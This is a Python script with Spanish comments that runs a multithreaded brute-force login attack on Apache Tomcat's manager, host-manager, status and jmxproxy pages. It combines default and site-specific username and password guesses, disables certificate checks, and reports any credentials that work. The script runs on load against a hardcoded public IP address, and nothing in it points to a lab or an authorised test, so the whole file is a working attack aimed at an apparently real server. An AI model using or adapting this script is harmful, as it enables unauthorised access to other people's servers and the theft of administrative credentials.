import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedTomcatBruteForce:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"

    def load_extended_wordlist(self):
        """Carga wordlist extendida específica para Tomcat"""
        users = ["admin", "tomcat", "manager", "root", "administrator", 
                "test", "user", "demo", "webmaster", "site", "sito"]
        
        passwords = [
            "admin", "tomcat", "password", "123456", "admin123", 
            "tomcat123", "Passw0rd", "Admin123", "password123",
            "1234", "12345", "123456789", "qwerty", "abc123",
            "admin@123", "Tomcat!", "tomcat!", "Admin!", 
            "P@ssw0rd", "P@ssword123", "sito", "misitio",
            "SITO", "MISITIO", "site", "SITE", "tomcat6",
            "Tomcat6", "6.0.53", "tomcat6.0", "manager123"
        ]
        
        return [(u, p) for u in users for p in passwords]

    def try_credential(self, data):
        """Intenta un par de credenciales"""
        url, username, password = data
        try:
            response = requests.get(url, auth=(username, password), 
                                  verify=False, timeout=10)
            if response.status_code == 200 and "Tomcat" in response.text:
                return True, url, username, password, response.text
        except:
            pass
        return False, None, None, None, None

    def brute_force_all_endpoints(self):
        """Fuerza bruta en todos los endpoints"""
        print("[*] Iniciando fuerza bruta avanzada...")
        
        endpoints = [
            f"{self.base_url}/manager/html",
            f"{self.base_url}/host-manager/html",
            f"{self.base_url}/manager/status",
            f"{self.base_url}/manager/jmxproxy"
        ]
        
        credentials = self.load_extended_wordlist()
        tasks = []
        
        for endpoint in endpoints:
            for username, password in credentials:
                tasks.append((endpoint, username, password))
        
        print(f"[*] Probando {len(tasks)} combinaciones...")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(self.try_credential, tasks)
            
            for success, url, user, pwd, content in results:
                if success:
                    print(f"\n[!] ¡CREDENCIALES VÁLIDAS ENCONTRADAS!")
                    print(f"    URL: {url}")
                    print(f"    Usuario: {user}")
                    print(f"    Contraseña: {pwd}")
                    
                    # Guardar cookies/sesión para uso futuro
                    if "JSESSIONID" in content:
                        print(f"    Sesión: JSESSIONID encontrado")
                    return user, pwd
        
        print("[-] No se encontraron credenciales válidas")
        return None, None

# Ejecutar fuerza bruta mejorada
brute_forcer = AdvancedTomcatBruteForce("189.254.143.102")
brute_forcer.brute_force_all_endpoints()